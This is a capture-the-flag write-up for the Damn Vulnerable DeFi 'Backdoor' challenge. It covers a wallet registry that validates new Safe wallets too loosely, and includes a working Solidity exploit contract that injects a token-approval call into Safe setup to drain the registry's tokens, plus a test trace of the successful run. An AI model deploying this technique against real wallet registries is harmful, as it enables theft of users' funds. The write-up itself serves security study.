# Damn Vulnerable DeFi - Backdoor - Solution Report

## Problem Analysis

### Contract Summary

The challenge revolves around a `WalletRegistry` contract that integrates with the Safe (formerly Gnosis Safe) smart contract wallet system. Key components include:

1. `WalletRegistry`:

   - Manages the registration of Safe wallets for beneficiaries
   - Implements `IProxyCreationCallback` to be called when a new Safe wallet is created
   - Distributes 10 DVT tokens to each newly registered wallet

2. `Safe`:

   - A multi-signature wallet contract
   - Allows for customizable setup including owners, threshold, and modules

3. `SafeProxy`:

   - Proxy contract for the Safe wallet
   - Allows for upgradeable Safe implementations

4. `SafeProxyFactory`:
   - Creates new Safe wallets as proxies
   - Allows for callback to `WalletRegistry` upon creation

Key functions:

- `WalletRegistry.proxyCreated()`: Validates new Safe wallets and distributes tokens
- `Safe.setup()`: Initializes a new Safe wallet with owners and settings
- `SafeProxyFactory.createProxyWithCallback()`: Creates a new Safe wallet and calls the registry

### Initial Setup

- 4 beneficiaries: Alice, Bob, Charlie, and David
- 40 DVT tokens in the `WalletRegistry` contract
- No Safe wallets created initially

### Success Criteria

- All 40 DVT tokens must be transferred from the `WalletRegistry` to the attacker's recovery address
- This must be accomplished in a single transaction

## Vulnerability

The primary vulnerability in this challenge lies in the `WalletRegistry` contract, specifically in the `proxyCreated` function. The key issues are:

1. Insufficient validation of wallet setup (lines 82-86 in `WalletRegistry.sol`):

   ```solidity
   uint256 threshold = Safe(walletAddress).getThreshold();
   if (threshold != EXPECTED_THRESHOLD) {
       revert InvalidThreshold(threshold);
   }

   address[] memory owners = Safe(walletAddress).getOwners();
   if (owners.length != EXPECTED_OWNERS_COUNT) {
       revert InvalidOwnersCount(owners.length);
   }
   ```

   The contract only checks the threshold and the number of owners, but doesn't validate the actual owner addresses or other setup parameters.

2. Trust in initial setup call (line 75 in `WalletRegistry.sol`):

   ```solidity
   if (bytes4(initializer[:4]) != Safe.setup.selector) {
       revert InvalidInitialization();
   }
   ```

   The contract only checks that the `setup` function was called, but doesn't validate its parameters.

3. Lack of validation for additional contract calls during setup (no check present in `WalletRegistry.sol`):
   The contract doesn't prevent or check for additional function calls that might be included in the initialization data.

These vulnerabilities allow an attacker to:

1. Create a Safe wallet for each beneficiary without their consent.
2. Include malicious setup parameters or additional function calls during wallet creation.
3. Gain control over the newly created wallets and their funds.

The root cause of this vulnerability is the assumption that only legitimate beneficiaries will create wallets, and that the `setup` function call alone is sufficient to ensure a secure wallet configuration. This highlights the importance of thorough validation and the principle of least privilege in smart contract design.

## Attack Method

The attack exploits the vulnerabilities in the `WalletRegistry` contract to create Safe wallets for all beneficiaries and extract the DVT tokens in a single transaction. The attack method involves the following steps:

1. Deploy an attack contract (`BackdoorAttack`):

   - This contract orchestrates the entire attack in a single transaction.

2. For each beneficiary (Alice, Bob, Charlie, and David):
   a. Prepare the initialization data for a new Safe wallet:

   - Set the beneficiary as the owner to pass the registry's checks.
   - Include a call to `setupModules(to, data)` in the Safe setup, where:
     - `to` is the address of the attack contract.
     - `data` is the encoded call to `approveToken()` function in the attack contract.

   b. Use `SafeProxyFactory.createProxyWithCallback()` to create a new Safe wallet:

   - Pass the prepared initialization data.
   - Set the `WalletRegistry` as the callback.

   c. The `WalletRegistry` will:

   - Validate the new wallet (which passes all checks).
   - Register the wallet for the beneficiary.
   - Transfer 10 DVT tokens to the new wallet.

   d. Immediately after creation, the attack contract:

   - Calls `transferFrom()` on the DVT token contract.
   - Moves the 10 DVT tokens from the new Safe wallet to the attacker's recovery address.

3. Repeat the process for all four beneficiaries:

   - This results in the creation of four Safe wallets.
   - Each wallet receives 10 DVT tokens, which are then transferred to the attacker.

4. By the end of the transaction:
   - All 40 DVT tokens from the `WalletRegistry` have been moved to the attacker's recovery address.
   - Four Safe wallets have been created and registered, one for each beneficiary.

## Proof of Concept (PoC)

### Core Implementation

The core of the attack is implemented in the `BackdoorAttack` contract. Here are the key parts of the implementation:

1. Contract setup:

```solidity
contract BackdoorAttack {
    Safe immutable singletonCopy;
    SafeProxyFactory immutable walletFactory;
    DamnValuableToken immutable token;
    WalletRegistry immutable walletRegistry;
    address[] public users;
    address immutable recoveryAddress;

    constructor(
        address _singletonCopy,
        address _walletFactory,
        address _token,
        address _walletRegistry,
        address[] memory _users,
        address _recoveryAddress
    ) {
        // ... (initialization of contract variables)
    }
}
```

2. The main attack function:

```solidity
function attack() external {
    for (uint256 i = 0; i < users.length; i++) {
        address beneficiary = users[i];

        // Create Safe wallet for the beneficiary with malicious setup
        address[] memory owners = new address[](1);
        owners[0] = beneficiary;

        bytes memory maliciousCalldata =
            abi.encodeWithSelector(this.approveToken.selector, address(token), address(this), type(uint256).max);

        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            1, // threshold
            address(this), // to
            maliciousCalldata, // data
            address(0), // fallbackHandler
            address(0), // paymentToken
            0, // payment
            payable(address(0)) // paymentReceiver
        );

        SafeProxy proxy = walletFactory.createProxyWithCallback(
            address(singletonCopy), initializer, uint256(uint160(beneficiary)), walletRegistry
        );

        // Transfer tokens from the Safe to the recovery address
        uint256 safeBalance = token.balanceOf(address(proxy));
        token.transferFrom(address(proxy), recoveryAddress, safeBalance);
    }
}
```

3. The `approveToken` function that gets called during Safe setup:

```solidity
function approveToken(address _token, address spender, uint256 amount) external {
    DamnValuableToken(_token).approve(spender, amount);
}
```

4. The test setup and execution in `BackdoorChallenge`:

```solidity
function test_backdoor() public checkSolvedByPlayer {
    BackdoorAttack attackContract = new BackdoorAttack(
        address(singletonCopy), address(walletFactory), address(token), address(walletRegistry), users, recovery
    );

    attackContract.attack();
}
```

### Running Result

```
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [641] WalletRegistry::wallets(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0xb19D1906C1fC5ab824CB248E917Eb9959AA1872f]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [541] WalletRegistry::beneficiaries(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [641] WalletRegistry::wallets(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0xBD98200cEEdAbF570D07bfd1b4277EdD136CaD54]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [541] WalletRegistry::beneficiaries(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [641] WalletRegistry::wallets(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0xd0e76dDb892037109d7f934637c1ba4cd45EF1D9]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [541] WalletRegistry::beneficiaries(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [641] WalletRegistry::wallets(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]
    │   └─ ← [Return] SafeProxy: [0x92e11C6104A460Cb25cb355BaDA08938fBf1544D]
    ├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]
    │   └─ ← [Return]
    ├─ [541] WalletRegistry::beneficiaries(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 40000000000000000000 [4e19]
    ├─ [0] VM::assertEq(40000000000000000000 [4e19], 40000000000000000000 [4e19]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
